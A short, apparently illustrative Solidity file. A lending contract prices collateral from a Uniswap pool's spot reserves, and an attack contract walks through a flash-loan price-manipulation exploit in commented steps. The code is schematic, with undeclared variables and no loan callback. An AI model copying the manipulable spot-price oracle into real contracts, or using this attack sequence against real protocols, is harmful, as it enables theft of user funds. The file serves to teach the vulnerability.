// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

contract Manipulable {
  // Lending protocol determines collateral value from Uniswap spot price
  function getPrice(address token) public view returns (uint256) {
      (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
      return uint256(reserve1) * 1e18 / uint256(reserve0);
  }

}

contract Attack {
  function attack() external {
      // 1. Flash loan a massive amount of Token A
      flashLoan.borrow(1_000_000e18);
      
      // 2. Dump Token A into the Uniswap pool → crashes Token A price, pumps Token B price
      router.swapExactTokensForTokens(1_000_000e18, 0, [tokenA, tokenB], address(this), block.timestamp);
      
      // 3. The lending protocol now thinks Token B is worth much more
      //    Deposit a small amount of Token B as collateral
      //    Borrow a huge amount of Token A against the inflated collateral value
      lendingProtocol.deposit(tokenB, smallAmount);
      lendingProtocol.borrow(tokenA, hugeAmount);
      
      // 4. Swap back to restore pool price, repay flash loan, keep profit
      router.swapExactTokensForTokens(tokenBAmount, 0, [tokenB, tokenA], address(this), block.timestamp);
      flashLoan.repay(1_000_000e18 + fee);
      
      // Profit = hugeAmount borrowed - repaid collateral value
  }

}
